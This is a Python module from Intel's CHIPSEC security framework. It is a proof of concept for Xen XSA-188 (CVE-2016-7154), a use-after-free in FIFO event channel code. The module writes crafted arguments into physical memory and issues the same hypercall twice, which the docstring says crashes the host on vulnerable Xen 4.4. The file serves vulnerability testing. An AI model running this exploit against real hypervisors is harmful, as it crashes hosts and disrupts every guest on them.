#CHIPSEC: Platform Security Assessment Framework
#Copyright (c) 2010-2016, Intel Corporation
# 
#This program is free software; you can redistribute it and/or
#modify it under the terms of the GNU General Public License
#as published by the Free Software Foundation; Version 2.
#
#This program is distributed in the hope that it will be useful,
#but WITHOUT ANY WARRANTY; without even the implied warranty of
#MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#GNU General Public License for more details.
#
#You should have received a copy of the GNU General Public License
#along with this program; if not, write to the Free Software
#Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
#
#Contact information:
#chipsec@intel.com
#


"""
 Proof-of-concept module for Xen XSA-188 (https://xenbits.xen.org/xsa/advisory-188.html)
 CVE-2016-7154: "use after free in FIFO event channel code"
 Discovered by Mikhail Gorobets

 This module triggers host crash on vulnerable Xen 4.4

 Usage:
   ``chipsec_main.py -m tools.vmm.xen.xsa188``
"""

from chipsec.hal.vmm        import *
from chipsec.module_common  import *

EVENT_CHANNEL_OP     = 32
EVTCHOP_INIT_CONTROL = 11

class xsa188(BaseModule):
    def run( self, module_argv ):
        (args_va, args_pa) = self.cs.mem.alloc_physical_mem(0x1000, 0xFFFFFFFFFFFFFFFF)
        args = '\xFF' * 8 + '\x00' * 16
        self.cs.mem.write_physical_mem(args_pa, len(args), args)
        self.vmm = VMM(self.cs)
        self.vmm.hypercall64_five_args(EVENT_CHANNEL_OP, EVTCHOP_INIT_CONTROL, args_va)
        self.vmm.hypercall64_five_args(EVENT_CHANNEL_OP, EVTCHOP_INIT_CONTROL, args_va)
        return ModuleResult.PASSED
